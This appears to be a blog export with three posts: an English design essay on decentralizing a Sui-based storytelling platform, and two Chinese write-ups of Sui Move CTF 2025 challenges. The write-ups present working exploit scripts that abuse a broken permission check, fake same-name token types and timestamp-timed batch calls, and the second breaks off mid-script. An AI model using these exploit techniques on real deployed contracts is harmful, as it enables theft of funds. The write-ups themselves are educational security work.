[{"title":"NarrFlow: A Journey Toward True Blockchain Decentralization","url":"/2025/09/13/MeAndNarrflow/","content":"## Abstract\n\nFor a long time, blockchain technology has been primarily driven by capital speculation, with fewer people focusing on creating genuine entertainment experiences rather than monetary betting mechanisms. NarrFlow represents an attempt to break this pattern. If you observe the current blockchain gaming landscape, you'll find that most projects are essentially sophisticated gambling platforms disguised as games. This artificial stimulation of reward mechanisms, while profitable, doesn't contribute to healthy digital entertainment ecosystems.\n\n## An Introduction to NarrFlow\n\nI explored a more accessible and traditional approach to blockchain-based collaborative storytelling. Imagine a platform where users can collectively determine the direction of narratives while maintaining democratic control over both content and governance mechanisms.\n\nNarrFlow is a novel-based collaboration platform where users work together to create stories through consensus-driven voting. The platform eliminates gambling mechanics entirely—participants pay only minimal gas fees to contribute with equal opportunity. This represents a step toward genuine decentralization in blockchain entertainment.\n\n## Current Technical Implementation and Limitations\n\n### Architecture Overview\n\nThe current NarrFlow implementation adopts a hybrid approach that balances user experience with decentralization principles, though with notable compromises:\n\n```javascript\n// Current Architecture Flow\nFrontend (React) → Backend API (Node.js/Express) → Database (Supabase) → Smart Contract (Sui)\n\n// Voting Process\n1. User submits proposal → Stored in Supabase\n2. Users cast votes → Recorded in database  \n3. Cron job monitors countdown → Server-side timer\n4. Admin wallet executes → Writes winner to blockchain\n```\n\n### Critical Centralization Issues\n\n**1. Voting Transparency Problem**\n\n* All voting data resides in Supabase database\n* Users cannot independently verify vote integrity\n* Vote counting occurs on centralized servers\n\n**2. Single Point of Failure**\n\n```javascript\n// Problematic dependency on server availability\nsetInterval(() => {\n    checkExpiredVotingSessions();\n    executeWinningProposal();\n}, 30000); // Server crash = system halt\n```\n\n**3. Trust Requirements**\n\n* Backend holds admin private keys\n* Users must trust server operators\n* No cryptographic proof of fair voting\n\n### Why These Limitations Exist\n\nThe centralized components weren't implemented due to Layer1 blockchain limitations, but rather to optimize for:\n\n* ​**Gas cost reduction**​: Avoiding per-vote transaction fees\n* ​**User experience**​: Instant feedback without blockchain confirmation delays\n* ​**Development simplicity**​: Traditional web architecture patterns\n\nHowever, modern Layer1 solutions like Sui offer capabilities that make full decentralization feasible without sacrificing usability.\n\n## Technical Deep Dive: Blockchain Fundamentals\n\n### Understanding Layer1 Capabilities\n\n**Transaction Throughput Evolution:**\n\n* Bitcoin: \\~7 TPS (Transactions Per Second)\n* Ethereum: \\~15 TPS\n* **Modern Layer1s:**\n  * Sui: 297,000 TPS theoretical, 65,000+ practical\n  * Solana: 65,000 TPS\n  * Avalanche: 4,500+ TPS\n\n**Smart Contract Limitations vs Reality:**\n\n```rust\n// Move language on Sui supports complex logic\npublic entry fun complex_voting_logic(\n    session: &mut VotingSession,\n    proposals: vector<Proposal>,\n    voter_weights: Table<address, u64>\n) {\n    // Modern contracts can handle sophisticated operations\n    // including real-time calculations, dynamic rewards,\n    // and multi-step consensus mechanisms\n}\n```\n\n### Consensus Mechanisms and Voting\n\n**Byzantine Fault Tolerance in Practice:**\n\n```pseudocode\n// Blockchain consensus ensures voting integrity\nCONSENSUS_PROTOCOL:\n    FOR each voting transaction:\n        1. Cryptographic signature verification\n        2. Double-voting prevention  \n        3. Immutable vote recording\n        4. Distributed validation across nodes\n        \n    RESULT: Mathematically provable vote integrity\n```\n\n**Gas Economics:**\n\n* Sui's gas model: Object-based pricing, not computation-based\n* Batch operations can reduce costs significantly\n* Sponsored transactions possible for user onboarding\n\n## Proposed Decentralization Improvements\n\n### 1. On-Chain Voting System\n\n**Current vs Improved:**\n\n```javascript\n// Current: Centralized voting\nasync function vote(proposalId, userId) {\n    await database.votes.insert({\n        proposal_id: proposalId,\n        user_id: userId,\n        timestamp: Date.now()\n    });\n}\n\n// Improved: Blockchain voting\nasync function vote(sessionId, proposalIndex) {\n    const tx = new TransactionBlock();\n    tx.moveCall({\n        target: `${PACKAGE_ID}::voting::cast_vote`,\n        arguments: [tx.object(sessionId), tx.pure(proposalIndex)]\n    });\n    return await signAndExecuteTransaction(tx);\n}\n```\n\n**Smart Contract Implementation:**\n\n```rust\n// Complete voting session structure\npublic struct VotingSession has key, store {\n    id: UID,\n    proposals: vector<Proposal>,\n    votes: Table<address, u64>,        // voter -> proposal_index\n    end_timestamp: u64,\n    min_votes_required: u64,\n    status: u8,                        // 0=active, 1=completed, 2=failed\n}\n\npublic entry fun cast_vote(\n    session: &mut VotingSession,\n    proposal_index: u64,\n    ctx: &mut TxContext\n) {\n    let voter = tx_context::sender(ctx);\n    let current_time = tx_context::epoch_timestamp_ms(ctx);\n    \n    // Validation\n    assert!(current_time < session.end_timestamp, E_VOTING_ENDED);\n    assert!(!table::contains(&session.votes, voter), E_ALREADY_VOTED);\n    \n    // Record vote\n    table::add(&mut session.votes, voter, proposal_index);\n    \n    // Update proposal vote count\n    let proposal = vector::borrow_mut(&mut session.proposals, proposal_index);\n    proposal.vote_count = proposal.vote_count + 1;\n    \n    // Emit event for real-time updates\n    event::emit(VoteEvent {\n        session_id: object::id(session),\n        voter,\n        proposal_index,\n        timestamp: current_time\n    });\n}\n```\n\n### 2. Decentralized Timer Mechanism\n\n**Problem with Cron Jobs:**\n\n```javascript\n// Centralized timing - single point of failure\ncron.schedule('*/30 * * * * *', () => {\n    checkExpiredSessions(); // What if server crashes?\n});\n```\n\n**Blockchain-Native Solution:**\n\n```rust\n// Anyone can trigger session finalization\npublic entry fun finalize_session(\n    session: &mut VotingSession,\n    story: &mut Story,\n    ctx: &mut TxContext\n) {\n    let current_time = tx_context::epoch_timestamp_ms(ctx);\n    \n    // Time-based validation\n    assert!(current_time >= session.end_timestamp, E_NOT_EXPIRED);\n    assert!(session.status == 0, E_ALREADY_FINALIZED);\n    \n    let (winner_exists, winner_index) = find_winning_proposal(session);\n    \n    if (winner_exists && meets_minimum_threshold(session)) {\n        // Execute winning proposal\n        let winner = vector::borrow(&session.proposals, winner_index);\n        execute_story_update(story, winner, ctx);\n        \n        // Reward distribution\n        distribute_rewards(session, winner_index, ctx);\n        session.status = 1;\n        \n        // Create next voting round\n        create_next_session(determine_next_type(story), ctx);\n    } else {\n        // Restart voting if insufficient participation\n        session.status = 2;\n        create_retry_session(session.session_type, ctx);\n    }\n}\n\n// Incentivize timely finalization\nfun distribute_rewards(session: &VotingSession, winner_index: u64, ctx: &mut TxContext) {\n    let total_pool = calculate_reward_pool(session);\n    let finalizer = tx_context::sender(ctx);\n    \n    // 70% to content winner\n    // 20% split among voters  \n    // 10% to finalizer (whoever calls this function)\n    reward_participants(session, winner_index, finalizer, total_pool);\n}\n```\n\n### 3. Event-Driven Real-Time Updates\n\n**Replace Database Polling with Blockchain Events:**\n\n```typescript\n// Frontend event subscription\nclass BlockchainVotingService {\n    async subscribeToVotingUpdates(sessionId: string) {\n        return await suiClient.subscribeEvent({\n            filter: {\n                MoveEventType: `${PACKAGE_ID}::voting::VoteEvent`\n            },\n            onMessage: (event) => {\n                if (event.parsedJson.session_id === sessionId) {\n                    this.updateVotingUI(event.parsedJson);\n                }\n            }\n        });\n    }\n    \n    // Real-time vote counting from blockchain state\n    async getCurrentVotes(sessionId: string) {\n        const session = await suiClient.getObject({\n            id: sessionId,\n            options: { showContent: true }\n        });\n        \n        return this.parseVotingResults(session.data.content);\n    }\n}\n```\n\n### 4. Advanced Consensus Mechanisms\n\n**Weighted Voting Implementation:**\n\n```rust\npublic struct VoterProfile has key, store {\n    id: UID,\n    contributions: u64,        // Past story contributions\n    reputation_score: u64,     // Community-determined reputation  \n    voting_power: u64,         // Calculated voting weight\n}\n\n// Calculate dynamic voting weights\nfun calculate_voting_power(profile: &VoterProfile, session: &VotingSession): u64 {\n    let base_power = 100;\n    let contribution_bonus = min(profile.contributions * 10, 500);\n    let reputation_bonus = min(profile.reputation_score * 5, 300);\n    \n    base_power + contribution_bonus + reputation_bonus\n}\n\n// Quadratic voting to prevent vote buying\nfun apply_quadratic_voting(raw_votes: u64): u64 {\n    // Cost increases quadratically: 1 vote = 1 token, 2 votes = 4 tokens, etc.\n    let cost = raw_votes * raw_votes;\n    cost\n}\n```\n\n**Sybil Resistance Mechanisms:**\n\n```rust\n// Proof of contribution requirement\npublic entry fun register_voter(\n    registry: &mut VoterRegistry,\n    proof_of_contribution: vector<u8>, // IPFS hash of past contributions\n    ctx: &mut TxContext\n) {\n    let voter = tx_context::sender(ctx);\n    \n    // Verify minimum contribution threshold\n    assert!(verify_contribution_proof(proof_of_contribution), E_INSUFFICIENT_CONTRIBUTION);\n    \n    // Stake requirement to prevent spam\n    let stake = coin::split(&mut payment, MINIMUM_STAKE, ctx);\n    \n    create_voter_profile(registry, voter, stake, proof_of_contribution, ctx);\n}\n```\n\n## Content Storage and Verification\n\n### Decentralized Content Management\n\n**IPFS Integration:**\n\n```typescript\n// Store large content off-chain, hash on-chain\nclass ContentManager {\n    async storeProposal(content: string): Promise<string> {\n        // Upload to IPFS\n        const ipfsHash = await this.ipfs.add(content);\n        \n        // Verify content integrity\n        const retrieved = await this.ipfs.get(ipfsHash);\n        assert(retrieved === content, \"Content integrity check failed\");\n        \n        return ipfsHash;\n    }\n    \n    async submitProposal(content: string, sessionId: string) {\n        const contentHash = await this.storeProposal(content);\n        const preview = content.substring(0, 200); // First 200 chars on-chain\n        \n        const tx = new TransactionBlock();\n        tx.moveCall({\n            target: `${PACKAGE_ID}::voting::submit_proposal`,\n            arguments: [\n                tx.object(sessionId),\n                tx.pure(contentHash),    // IPFS hash\n                tx.pure(preview),        // Preview text\n                tx.pure(content.length)  // Content length for verification\n            ]\n        });\n        \n        return await this.signAndExecute(tx);\n    }\n}\n```\n\n**Content Verification:**\n\n```rust\npublic struct Proposal has store, drop {\n    content_hash: String,      // IPFS hash\n    content_preview: String,   // First 200 characters\n    content_length: u64,       // Original length for verification\n    author: address,\n    vote_count: u64,\n    quality_score: u64,        // Community-assessed quality\n}\n\n// Verify content integrity when retrieved\npublic fun verify_content_integrity(\n    proposal: &Proposal,\n    full_content: String\n): bool {\n    // Verify length\n    if (string::length(&full_content) != proposal.content_length) return false;\n    \n    // Verify preview matches\n    let preview = string::sub_string(&full_content, 0, 200);\n    if (preview != proposal.content_preview) return false;\n    \n    // Hash verification (simplified)\n    let computed_hash = compute_content_hash(&full_content);\n    computed_hash == proposal.content_hash\n}\n```\n\n## Economic Model and Tokenomics\n\n### Multi-Layered Incentive System\n\n```rust\n// Dynamic reward calculation\npublic fun calculate_rewards(\n    session: &VotingSession,\n    winner_index: u64\n): (u64, u64, u64) { // (winner_reward, voter_rewards, finalizer_reward)\n    \n    let base_pool = BASE_REWARD_PER_SESSION;\n    let participation_bonus = session.total_votes * PARTICIPATION_MULTIPLIER;\n    let quality_bonus = calculate_quality_bonus(session, winner_index);\n    \n    let total_pool = base_pool + participation_bonus + quality_bonus;\n    \n    // Distribution: 60% winner, 30% voters, 10% finalizer\n    let winner_reward = total_pool * 60 / 100;\n    let voter_pool = total_pool * 30 / 100;\n    let finalizer_reward = total_pool * 10 / 100;\n    \n    (winner_reward, voter_pool, finalizer_reward)\n}\n\n// Reputation-based rewards\npublic fun update_reputation(\n    profile: &mut VoterProfile,\n    action_type: u8, // 0=proposal_won, 1=good_vote, 2=participation\n    impact_score: u64\n) {\n    match action_type {\n        0 => profile.reputation_score += impact_score * 3, // Winning proposals\n        1 => profile.reputation_score += impact_score,     // Voting for winners\n        2 => profile.reputation_score += impact_score / 2, // Participation\n        _ => {}\n    }\n}\n```\n\n## Gas Optimization Strategies\n\n### Batch Operations and State Compression\n\n```rust\n// Batch multiple votes in single transaction\npublic entry fun batch_vote(\n    sessions: vector<ID>,\n    proposals: vector<u64>,\n    ctx: &mut TxContext\n) {\n    let voter = tx_context::sender(ctx);\n    let i = 0;\n    \n    while (i < vector::length(&sessions)) {\n        let session_id = *vector::borrow(&sessions, i);\n        let proposal_index = *vector::borrow(&proposals, i);\n        \n        // Internal vote logic without separate transaction\n        execute_vote_internal(session_id, proposal_index, voter);\n        i = i + 1;\n    };\n    \n    // Single event emission for all votes\n    event::emit(BatchVoteEvent {\n        voter,\n        sessions,\n        proposals,\n        timestamp: tx_context::epoch_timestamp_ms(ctx)\n    });\n}\n\n// State compression for historical data\npublic struct CompressedVotingHistory has key, store {\n    id: UID,\n    session_summaries: vector<SessionSummary>, // Compressed results only\n    merkle_root: vector<u8>, // For detailed history verification\n}\n```\n\n## Migration Strategy\n\n### Phased Decentralization Approach\n\n**Phase 1: Hybrid Validation**\n\n```typescript\n// Run both systems in parallel\nasync function hybridVote(sessionId: string, proposalIndex: number) {\n    // Legacy system for immediate feedback\n    const dbResult = await database.recordVote(sessionId, proposalIndex);\n    \n    // Blockchain system for final authority\n    const blockchainTx = await blockchainVote(sessionId, proposalIndex);\n    \n    // Validate consistency\n    await validateVoteConsistency(dbResult, blockchainTx);\n}\n```\n\n**Phase 2: Gradual Migration**\n\n```typescript\n// Feature flags for progressive rollout\nconst useBlockchainVoting = await featureFlags.isEnabled('blockchain_voting');\nconst useBlockchainTimer = await featureFlags.isEnabled('blockchain_timer');\n\nif (useBlockchainVoting) {\n    await blockchainVotingService.vote(sessionId, proposalIndex);\n} else {\n    await legacyVotingService.vote(sessionId, proposalIndex);\n}\n```\n\n**Phase 3: Full Decentralization**\n\n* Remove all centralized components\n* Archive historical data to IPFS\n* Transition to pure blockchain governance\n\n## Conclusion\n\nThe current NarrFlow implementation demonstrates a pragmatic approach to blockchain application development, balancing user experience with decentralization principles. However, the analysis reveals that the centralized components exist not due to fundamental blockchain limitations, but rather as architectural choices prioritizing development speed and familiar patterns.\n\nModern Layer1 blockchains possess the technical capabilities to support fully decentralized collaborative storytelling platforms. The proposed improvements would eliminate single points of failure, enhance transparency, and create a truly trustless creative environment while maintaining excellent user experience.\n\nThe path forward involves a measured migration strategy that gradually shifts critical functionality to blockchain-native implementations, ultimately achieving the platform's stated goal of genuine decentralization in blockchain entertainment.\n\nThis evolution represents more than just technical improvement—it embodies the philosophical shift from treating blockchain as a speculative instrument to leveraging it as a foundation for transparent, democratic digital communities.\n\n","tags":["Web3"],"categories":["Web3"]},{"title":"SUI MOVE CTF 2025 (Swap) Write Up","url":"/2025/08/05/MOVE CTF 2025 (5-6)/","content":"# Sui Move CTF - Swap Challenge Writeup\n\n## 挑战概述\n\n这是一个Sui Move智能合约CTF挑战，目标是攻击一个流动性池合约，让合约中所有代币余额与累计手续费之和为零，从而获得Flag。\n\n### 挑战信息\n\n- **Package ID**: `0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a`\n- **部署交易**: `2CDJQ1PTg4iE1JZPxmcZuxV2SqFgprMWhwkEA6x6hURM`\n- **Pools对象ID**: `0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001`\n\n## 漏洞分析\n\n通过分析合约代码，我发现了三个关键漏洞：\n\n### 漏洞1: 权限控制错误 (Critical)\n\n**位置**: `set_fee_manager`函数 (第225行)\n\n```rust\npublic entry fun set_fee_manager(pools: &mut Pools, new_fee_manager: address, ctx: &mut TxContext) {\n    assert!(tx_context::sender(ctx) == new_fee_manager, 0);  // 错误的权限检查\n    pools.fee_manager = new_fee_manager;\n}\n```\n\n**问题**: 检查的是调用者是否等于新的fee_manager，而不是检查调用者是否是当前的fee_manager。\n\n**影响**: 任何人都可以将自己设置为fee_manager。\n\n### 漏洞2: 池子键值生成不安全 (High)\n\n**位置**: `get_struct`函数 (第149行)\n\n```rust\nfun get_struct<X>(): String {\n    let type_name = type_name::get<X>();\n    let address_part = type_name.get_address().length();\n    let module_part = type_name.get_module().length();\n    let full = type_name.borrow_string().length();\n    type_name.borrow_string().substring(address_part + module_part + 4, full)\n}\n```\n\n**问题**: 只使用结构体名称生成池子键值，不包含完整的类型路径。\n\n**影响**: 可以通过创建同名的假代币来混淆池子操作。\n\n### 漏洞3: is_solved条件可被绕过\n\n**位置**: `is_solved`函数 (第246行)\n\n```rust\npublic entry fun is_solved(pools: &mut Pools) {\n    let sum = get_balance<TOKEN1>(pools) + get_balance<TOKEN2>(pools) + \n              get_balance<TOKEN3>(pools) + get_balance<TOKEN4>(pools);\n    let fee_sum = get_total_fee<TOKEN1, TOKEN2>(pools) + get_total_fee<TOKEN3, TOKEN4>(pools);\n    assert!(sum + fee_sum == 0, 0);\n    // 发出Flag事件\n}\n```\n\n**问题**: 如果创建空的池子，所有余额和手续费都为0，条件自然满足。\n\n## 攻击策略\n\n基于发现的漏洞，制定了以下攻击策略：\n\n1. **利用权限漏洞**: 调用`set_fee_manager`将自己设置为fee_manager\n2. **创建假代币结构体**: 利用键值生成漏洞，创建同名的假TOKEN结构体\n3. **创建空池子**: 使用假代币创建空的池子，使余额和手续费都为0\n4. **触发Flag**: 调用`is_solved`函数获得Flag\n\n## 攻击实施\n\n### 步骤1: 利用权限漏洞\n\n```bash\nsui client call --package 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a \\\n  --module pool --function set_fee_manager \\\n  --args 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 \\\n         0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe \\\n  --gas-budget 10000000\n```\n\n**结果**: 成功成为fee_manager\n\n### 步骤2: 部署攻击合约\n\n创建包含假TOKEN结构体的攻击合约：\n\n```rust\nmodule exploit::attack {\n    // 创建假的TOKEN结构体，名称与原始代币相同\n    public struct TOKEN1 has drop {}\n    public struct TOKEN2 has drop {}  \n    public struct TOKEN3 has drop {}\n    public struct TOKEN4 has drop {}\n\n    fun init(_ctx: &mut TxContext) {\n        // 空的初始化函数\n    }\n}\n```\n\n**部署结果**:\n\n- 攻击合约Package ID: `0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07`\n\n### 步骤3: 创建假池子\n\n使用PTB (Programmable Transaction Block) 创建空的池子：\n\n```bash\n# 创建TOKEN1-TOKEN2池子\nsui client ptb \\\n  --move-call 0x2::coin::zero \"<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1>\" \\\n  --assign token1 \\\n  --move-call 0x2::coin::zero \"<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>\" \\\n  --assign token2 \\\n  --move-call 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::create_pool \\\n    \"<0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN1,0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07::attack::TOKEN2>\" \\\n    @0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 0 token1 token2 \\\n  --assign pool_cap1 \\\n  --transfer-objects \"[pool_cap1]\" @0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe \\\n  --gas-budget 20000000\n```\n\n**结果**: 成功创建TOKEN1-TOKEN2池子，获得PoolCap\n\n类似地创建TOKEN3-TOKEN4池子。\n\n### 步骤4: 触发Flag\n\n```bash\nsui client call --package 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a \\\n  --module pool --function is_solved \\\n  --args 0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001 \\\n  --gas-budget 20000000\n```\n\n**结果**: **攻击成功！**\n\n## 攻击结果\n\n**成功交易哈希**: `JYBCFLXdhzw1kNus4fVRwdvwYVrVQ29HP5Ut1xLXsQG`\n\n在交易事件中可以看到Flag事件：\n\n```\nEventType: 0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a::pool::Flag\nParsedJSON:\n  ┌──────┬────────────────────────────────────────────────────────────────────┐\n  │ user │ 0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe │\n  └──────┴────────────────────────────────────────────────────────────────────┘\n```\n\n## 技术要点\n\n### 1. PTB语法的正确使用\n\n- 使用`--assign`来创建变量引用\n- 正确的对象ID引用格式: `@<object_id>`\n- 类型参数格式: `\"<package::module::Type>\"`\n\n### 2. 假代币结构体的关键作用\n\n- 利用`get_struct`函数只检查结构体名称的漏洞\n- 创建同名但不同包的TOKEN结构体\n- 绕过类型系统检查\n\n### 3. 空池子的巧妙利用\n\n- 创建零余额的池子\n- 使所有`get_balance`和`get_total_fee`调用返回0\n- 满足`sum + fee_sum == 0`的条件\n\n## 防护建议\n\n1. **修复权限检查**:\n   \n   ```rust\n   assert!(tx_context::sender(ctx) == pools.fee_manager, 0);\n   ```\n2. **使用完整类型路径**:\n   \n   ```rust\n   fun get_struct<X>(): String {\n       type_name::get<X>().into_string()  // 使用完整类型路径\n   }\n   ```\n3. **增强is_solved检查**:\n   \n   - 检查池子是否已正确初始化\n   - 验证代币类型的合法性\n   - 添加额外的安全检查\n\n## 完整攻击脚本\n\n为了方便复现，这里提供完整的攻击脚本：\n\n```bash\n#!/bin/bash\n# 完整的CTF攻击脚本\n\nATTACK_PACKAGE=\"0x69adecee672848377110c4b60fa5392eac94349176068d0a877215fcf68e4a07\"\nTARGET_PACKAGE=\"0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a\"\nPOOLS_ID=\"0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001\"\nMY_ADDRESS=\"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe\"\n\necho \"Step 1: 利用权限漏洞成为fee_manager\"\nsui client call --package $TARGET_PACKAGE --module pool --function set_fee_manager \\\n  --args $POOLS_ID $MY_ADDRESS --gas-budget 10000000\n\necho \"Step 2: 创建假TOKEN1-TOKEN2池子\"\nsui client ptb \\\n  --move-call 0x2::coin::zero \"<${ATTACK_PACKAGE}::attack::TOKEN1>\" \\\n  --assign token1 \\\n  --move-call 0x2::coin::zero \"<${ATTACK_PACKAGE}::attack::TOKEN2>\" \\\n  --assign token2 \\\n  --move-call ${TARGET_PACKAGE}::pool::create_pool \"<${ATTACK_PACKAGE}::attack::TOKEN1,${ATTACK_PACKAGE}::attack::TOKEN2>\" @${POOLS_ID} 0 token1 token2 \\\n  --assign pool_cap1 \\\n  --transfer-objects \"[pool_cap1]\" @${MY_ADDRESS} \\\n  --gas-budget 20000000\n\necho \"Step 3: 创建假TOKEN3-TOKEN4池子\"\nsui client ptb \\\n  --move-call 0x2::coin::zero \"<${ATTACK_PACKAGE}::attack::TOKEN3>\" \\\n  --assign token3 \\\n  --move-call 0x2::coin::zero \"<${ATTACK_PACKAGE}::attack::TOKEN4>\" \\\n  --assign token4 \\\n  --move-call ${TARGET_PACKAGE}::pool::create_pool \"<${ATTACK_PACKAGE}::attack::TOKEN3,${ATTACK_PACKAGE}::attack::TOKEN4>\" @${POOLS_ID} 0 token3 token4 \\\n  --assign pool_cap2 \\\n  --transfer-objects \"[pool_cap2]\" @${MY_ADDRESS} \\\n  --gas-budget 20000000\n\necho \"Step 4: 触发Flag\"\nsui client call --package $TARGET_PACKAGE --module pool --function is_solved \\\n  --args $POOLS_ID --gas-budget 20000000\n```\n\n## 学习要点\n\n### 1. Sui Move类型系统的理解\n\n- 泛型类型参数的使用\n- 结构体的witness模式\n- 类型安全的重要性\n\n### 2. PTB的强大功能\n\n- 可编程交易块允许复杂的操作组合\n- 正确的语法对攻击成功至关重要\n- 变量引用和对象传递\n\n### 3. 动态字段的工作原理\n\n- Sui的动态字段存储机制\n- 键值生成和查找过程\n- 类型擦除的安全隐患\n\n## 总结\n\n这次攻击成功利用了Sui Move合约中的多个设计缺陷，特别是权限控制错误和类型系统的不当使用。通过创建假代币结构体和空池子，巧妙地绕过了安全检查，最终获得了Flag。\n\n关键成功因素：\n\n1. **深入的代码分析** - 仔细阅读合约代码，发现多个漏洞\n2. **正确的攻击策略** - 将多个漏洞组合使用\n3. **技术实现能力** - 正确使用PTB和Sui CLI\n4. **持续的调试** - 在遇到问题时不断调整方法\n\n这个案例展示了智能合约安全审计的重要性，特别是在权限管理和类型安全方面需要格外谨慎。对于开发者来说，这提醒我们要：\n\n- 仔细检查权限控制逻辑\n- 使用完整的类型标识符\n- 进行充分的安全测试\n- 考虑各种边界情况\n\n","tags":["CTF","Web3"],"categories":["CTF","Web3"]},{"title":"SUI MOVE CTF 2025 (1-4) Write Up","url":"/2025/08/05/MOVE CTF 2025/","content":"# Sui Move CTF 2025(1-4) WriteUp\n\n## 概述\n\n本文档包含了四道Sui Move CTF挑战的完整解题过程，涵盖了智能合约漏洞利用、算法分析、密码学攻击和路径搜索等多个技术领域。每个题目都保留了完整的技术细节、代码实现和解题过程。\n\n## 目录\n\n1. [冒险游戏 - 智能合约漏洞利用](#1-冒险游戏)\n2. [强盗游戏 - 动态规划算法](#2-强盗游戏)\n3. [恢复密钥 - 格理论密码学](#3-恢复密钥)\n4. [迷宫游戏 - 路径搜索算法](#4-迷宫游戏)\n\n---\n\n# 1. 冒险游戏\n\n## 挑战概述\n\n这是一个基于Sui Move智能合约的CTF挑战，目标是通过利用合约漏洞获取Flag。挑战涉及一个冒险游戏，玩家需要控制英雄击败怪物来获得token，最终购买宝箱获取Flag。\n\n## 合约分析\n\n### 核心合约结构\n\n挑战包含三个主要模块：\n\n- `adventure.move` - 主要游戏逻辑\n- `hero.move` - 英雄系统\n- `inventory.move` - 物品和Flag系统\n\n### 关键漏洞发现\n\n#### 1. 体力消耗漏洞\n\n在 `slay_boar_king` 函数中发现关键漏洞：\n\n```rust\nentry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {\n    // ...\n    //hero::decrease_stamina(hero, 2);  // 这行被注释掉了！\n    // ...\n}\n```\n\n**影响**: 击败野猪王不消耗体力，可以无限次攻击。\n\n#### 2. 时间戳依赖漏洞\n\ntoken奖励基于时间戳：\n\n```rust\nif (fight_result == 1) {\n    let current_timestamp = clock::timestamp_ms(clock);\n    let d100 = current_timestamp % 3;\n\n    if (d100 == 1) {\n        // 增加5个token\n        *current_balance = *current_balance + 5;\n    } else {\n        // 减少5个token\n        *current_balance = *current_balance - 5;\n    }\n}\n```\n\n**影响**: 只有当 `timestamp % 3 == 1` 时才能获得token奖励。\n\n#### 3. 计费错误漏洞\n\n在 `buy_box` 函数中：\n\n```rust\nassert!(*current_balance >= 200, ERROR_NO_MONEY);  // 检查200\n*current_balance = *current_balance - 100;         // 但只扣除100\n```\n\n**影响**: 检查需要200个token但实际只扣除100个。\n\n## 攻击策略\n\n### 阶段1: 英雄战斗力提升\n\n发现英雄初始属性不足以击败野猪王：\n\n- 初始strength: 10\n- 野猪王defense: 10-15\n\n**解决方案**: 升级英雄系统\n\n- 击败普通野猪获得经验（每次+10经验）\n- 100经验可升级，升级后strength增加30点\n\n### 阶段2: PTB时间戳攻击\n\n利用Programmable Transaction Block (PTB)确保所有操作使用相同时间戳：\n\n1. 等待有利时间戳（`timestamp % 3 == 1`）\n2. 在单个PTB中执行20次 `slay_boar_king`调用\n3. 每次成功+5 token，从100增加到200\n\n### 阶段3: 购买宝箱获取Flag\n\n1. 利用计费错误购买宝箱（检查200但只扣100）\n2. 调用 `get_flag`函数获取Flag事件\n\n## 攻击实现\n\n### 英雄升级脚本\n\n```bash\n# 击败30只普通野猪获得经验\nfor i in {1..30}; do\n    sui client call --package $PACKAGE_ID --module adventure --function slay_boar \\\n        --args $HERO_ID --gas-budget 20000000\ndone\n\n# 升级英雄\nsui client call --package $PACKAGE_ID --module hero --function level_up \\\n    --args $HERO_ID --gas-budget 20000000\n```\n\n### PTB批量攻击脚本\n\n核心攻击脚本 `ptb_batch_attack.sh`：\n\n```bash\n#!/bin/bash\n\n# 合约配置\nPACKAGE_ID=\"0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d\"\nHERO_ID=\"0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134\"\nUSERS_TOKEN_AMOUNT_ID=\"0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45\"\nCLOCK_ID=\"0x6\"\n\n# PTB攻击函数\nexecute_ptb_attack() {\n    local batch_size=$1\n    PTB_CMD=\"sui client ptb\"\n  \n    # 构建20次slay_boar_king调用\n    for ((i=1; i<=batch_size; i++)); do\n        PTB_CMD=\"$PTB_CMD --move-call $PACKAGE_ID::adventure::slay_boar_king \\\"\\\" @$CLOCK_ID @$USERS_TOKEN_AMOUNT_ID @$HERO_ID\"\n    done\n  \n    PTB_CMD=\"$PTB_CMD --gas-budget 100000000\"\n    RESULT=$(eval $PTB_CMD 2>&1)\n  \n    # 检查Amount事件\n    if echo \"$RESULT\" | grep -q \"Amount\"; then\n        AMOUNT=$(echo \"$RESULT\" | grep -A 5 \"Amount\" | grep \"amount\" | tail -1 | grep -o '[0-9]\\+')\n        if [ \"$AMOUNT\" -ge 200 ]; then\n            return 0\n        fi\n    fi\n    return 1\n}\n\n# 主攻击循环\nfor attempt in $(seq 1 100); do\n    TIMESTAMP=$(date +%s)\n    REMAINDER=$((TIMESTAMP % 3))\n  \n    if [ $REMAINDER -eq 1 ]; then\n        echo \"🎯 发现有利时间戳! 执行PTB攻击!\"\n  \n        if execute_ptb_attack 20; then\n            # 购买宝箱\n            BUY_RESULT=$(sui client call --package $PACKAGE_ID --module adventure --function buy_box --args $USERS_TOKEN_AMOUNT_ID --gas-budget 20000000 2>&1)\n  \n            # 提取宝箱ID并获取Flag\n            TREASURY_BOX_ID=$(echo \"$BUY_RESULT\" | grep -A 10 \"Created Objects\" | grep \"ID:\" | head 